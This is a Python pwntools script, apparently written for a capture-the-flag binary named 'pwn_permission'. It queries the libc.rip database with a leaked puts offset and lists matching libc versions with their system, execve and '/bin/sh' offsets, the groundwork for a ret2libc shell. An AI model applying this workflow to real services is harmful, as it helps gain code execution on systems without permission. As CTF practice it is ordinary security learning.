from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

import requests
import json

# Query libc.rip API with the exact puts offset
api_url = "https://libc.rip/api/find"

# We know puts offset ends in 0x1e0
# Let's query with the exact offset
data = {
    "symbols": {
        "puts": "0x6d1e0"
    }
}

try:
    resp = requests.post(api_url, json=data, timeout=10)
    if resp.status_code == 200:
        libs = resp.json()
        log.info(f"Found {len(libs)} matching libc versions")
        for lib in libs:
            lib_id = lib.get('id', 'unknown')
            symbols = lib.get('symbols', {})
            log.info(f"\n{lib_id}:")
            for sym_name, sym_val in sorted(symbols.items()):
                if sym_name in ['puts', 'system', 'str_bin_sh', 'execve', '__libc_start_main']:
                    log.info(f"  {sym_name}: 0x{sym_val}")
    else:
        log.error(f"API error: {resp.status_code}")
except Exception as e:
    log.error(f"API query failed: {e}")

# Also try querying with just the last 3 nibbles
data2 = {
    "symbols": {
        "puts": "1e0"
    }
}

try:
    resp2 = requests.post(api_url, json=data2, timeout=10)
    if resp2.status_code == 200:
        libs2 = resp2.json()
        log.info(f"\n\nFound {len(libs2)} matching libc versions (by last 3 nibbles)")
        seen = set()
        for lib in libs2:
            lib_id = lib.get('id', 'unknown')
            symbols = lib.get('symbols', {})
            puts_off = symbols.get('puts', '0')
            system_off = symbols.get('system', '0')
            binsh_off = symbols.get('str_bin_sh', '0')
            
            key = (puts_off, system_off, binsh_off)
            if key in seen:
                continue
            seen.add(key)
            
            log.info(f"\n{lib_id}:")
            log.info(f"  puts: 0x{puts_off}")
            log.info(f"  system: 0x{system_off}")
            log.info(f"  str_bin_sh: 0x{binsh_off}")
except Exception as e:
    log.error(f"API query 2 failed: {e}")